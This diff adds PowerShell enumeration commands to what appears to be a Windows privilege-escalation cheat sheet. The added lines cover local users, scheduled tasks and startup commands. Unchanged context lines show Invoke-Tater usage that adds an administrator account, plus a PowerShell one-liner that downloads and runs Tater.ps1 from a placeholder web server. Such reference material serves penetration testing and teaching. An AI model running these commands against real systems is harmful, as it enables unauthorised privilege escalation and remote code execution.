@@ -23,7 +23,7 @@ current system:
 | **Hostname**  | hostname | $env:ComputerName<br/> $env:computername.$env:userdnsdomain <br/> (Get-WmiObject Win32_ComputerSystem).Name ||
 | **Curent Domain** | echo %userdomain% | $env:UserDomain<br/>(Get-WmiObject Win32_ComputerSystem).Domain ||
 | **Curent User**  | whoami /all<br/>net user %username%  | $env:UserName<br/>(Get-WmiObject Win32_ComputerSystem).UserName | |
-| **Local users**  | net users<br/>net users <USERNAME\> |  | wmic USERACCOUNT list full |
+| **Local users**  | net users<br/>net users <USERNAME\> | Get-WMIObject Win32_UserAccount -NameSpace "root\CIMV2" -Filter "LocalAccount='$True'" | wmic USERACCOUNT list full |
 | **Local groups** | net localgroup | *(Win10+)* Get-LocalGroup | wmic group list full |
 | **Local group users** | net localgroup Administrators<br/>net localgroup <GROUPNAME\> | | |
 | **Connected users** | qwinsta | | |
@@ -955,7 +955,7 @@ start."), the dependencies can be removed to fix the service:
 sc config <SERVICE_NAME> depend= ""
 ```
 
-### Scheduled tasks
+### Scheduled tasks & statup commands
 
 Scheduled tasks are used to automatically perform a routine task on the system
 whenever the criteria associated to the scheduled task occurs. The scheduled
@@ -974,9 +974,14 @@ task.
 ```
 # List all configured scheduled tasks - verbose
 schtasks /query /fo LIST /v
+Get-ScheduledTask
 
 # Query the specified scheduled task
 schtasks /v /query /fo LIST  /tn <TASK_NAME>
+Get-ScheduledTask -TaskName <TASK_NAME>
+
+# Start up commands
+Get-WMIObject Win32_StartupCommand -NameSpace "root\CIMV2"
 ```
 
 The commands below can be chained to filter the enabled scheduled tasks name and
@@ -1074,6 +1079,7 @@ Invoke-Tater -Command "net user <USERNAME> <PASSWORD> /add && net localgroup adm
 powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Tater.ps1'); Invoke-Tater -Command <POWERSHELLCMD>;
 ```
 
+--------------------------------------------------------------------------------
 ### Windows Subsystem for Linux (WSL) - TODO
 
 Windows Subsystem for Linux
